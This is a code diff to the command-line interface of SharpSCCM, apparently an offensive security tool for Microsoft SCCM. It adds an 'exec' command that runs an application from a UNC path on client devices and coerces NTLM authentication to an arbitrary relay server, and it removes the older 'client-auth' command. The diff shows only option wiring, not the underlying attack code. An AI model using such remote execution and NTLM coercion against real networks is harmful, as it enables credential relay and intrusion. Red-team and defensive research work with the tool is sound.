@@ -61,6 +61,21 @@ namespace SharpSCCM
                     MgmtPointWmi.AddUserToCollection(sccmConnection, userName, collectionName);
                 });
 
+            // exec command
+            var execCommand = new Command("exec", "Execute an application from a specified UNC path on a client device or collection of client devices (requires Full Administrator or Application Administrator access). This command can also be used to request NTLM authentication from an SCCM client device or device collection to an arbitrary destination.");
+            rootCommand.Add(execCommand);
+            execCommand.Add(new Option<string>(new[] { "--device", "-d" }, "The ResourceName of the device you would like to receive NTLM authentication from."));
+            execCommand.Add(new Option<string>(new[] { "--collection", "-c" }, "The Name of the device collection you would like to receive NTLM authentication from."));
+            execCommand.Add(new Option<string>(new[] { "--path", "-p" }, "The UNC path of the application to execute on the client device(s). "));
+            execCommand.Add(new Option<string>(new[] { "--relay-server", "-r" }, "To coerce NTLM authentication, specify the NetBIOS name, IP address, or if WebClient is enabled on the targeted client device, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. If left blank, NTLM authentication attempts will be sent to the machine running SharpSCCM."));
+            execCommand.Add(new Option<bool>(new[] { "--run-as-system", "-s" }, "Request NTLM authentication from the specified device's machine account rather than the default setting, which requests NTLM authentication from the logged on user."));
+            execCommand.Handler = CommandHandler.Create(
+                (string server, string sitecode, string device, string collection, string path, string relayServer, bool runAsSystem) =>
+                {
+                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    MgmtPointWmi.Exec(sccmConnection, device, collection, path, relayServer, !runAsSystem);
+                });
+
             // get 
             var getCommand = new Command("get", "A group of commands that query certain objects and display their contents");
             rootCommand.Add(getCommand);
@@ -262,20 +277,6 @@ namespace SharpSCCM
             // invoke
             var invokeCommand = new Command("invoke", "A group of commands that execute actions on the server");
             rootCommand.Add(invokeCommand);
-
-            // invoke client-auth
-            var invokeClientAuth = new Command("client-auth", "Request NTLM authentication from an SCCM client device or device collection to an arbitrary destination via NTLM (requires Full Administrator access)");
-            invokeCommand.Add(invokeClientAuth);
-            invokeClientAuth.Add(new Option<string>(new[] { "--device", "-d" }, "The ResourceName of the device you would like to receive NTLM authentication from."));
-            invokeClientAuth.Add(new Option<string>(new[] { "--collection", "-c" }, "The Name of the device collection you would like to receive NTLM authentication from."));
-            invokeClientAuth.Add(new Option<string>(new[] { "--relay-server", "-r" }, "The NetBIOS name, IP address, or if WebClient is enabled on the targeted client device, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. If left blank, NTLM authentication attempts will be sent to the machine running SharpSCCM."));
-            invokeClientAuth.Add(new Option<bool>(new[] { "--run-as-system", "-s" }, "Request NTLM authentication from the specified device's machine account rather than the default setting, which requests NTLM authentication from the logged on user."));
-            invokeClientAuth.Handler = CommandHandler.Create(
-                (string server, string sitecode, string device, string collection, string relayServer, bool runAsSystem) =>
-                {
-                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    MgmtPointWmi.InvokeClientAuth(sccmConnection, device, collection, relayServer, !runAsSystem);
-                });
 
             // invoke client-push
             var invokeClientPush = new Command("client-push", "Coerce the server to authenticate to an arbitrary destination via NTLM (if enabled) by registering a new device and sending a heartbeat data discovery record (DDR) with the ClientInstalled flag set to false. This command does not require local Administrator privileges but must be run from a client device. This command can also be run as an SCCM Administrator with the '--as-admin' option to use built-in functionality to initiate client push installation rather than registering a new client device.");
